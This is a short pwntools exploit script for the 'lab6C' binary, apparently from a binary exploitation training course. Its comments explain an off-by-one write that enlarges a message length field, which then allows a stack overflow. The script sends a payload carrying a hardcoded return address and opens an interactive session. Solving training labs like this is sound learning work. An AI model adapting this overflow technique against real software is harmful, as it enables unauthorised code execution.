#!/usr/bin/python3
from pwn import *
context.clear(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
for i in range(1):
	p = gdb.debug(['./lab6C'])
	#p = process('./lab6C')
	# in the function set_username()
	#   for(i = 0; i <= 40 && readbuf[i]; i++)
	#        save->username[i] = readbuf[i];
	# since i<=40 there is an off-by-1 bug
	# which allows us to write an extra byte to
	# the struct when overwrites the message len
	p.sendline(b'\xff'*40+b'\xff')
	# we can overwrite savestate->msglen to 0xff
	# so in set_tweet()
	# save->msglen now reads in all 1024 bytes
	#   fgets(readbuf, 1024, stdin);
	#    strncpy(save->tweet, readbuf, save->msglen);
	#p.sendline(cyclic(1024))
	# cyclic_find(what overwrites sp)
	p.send(b'\xff'*196+p32(0xb775d72b))
	# p.sendline('pwd')
	p.interactive()
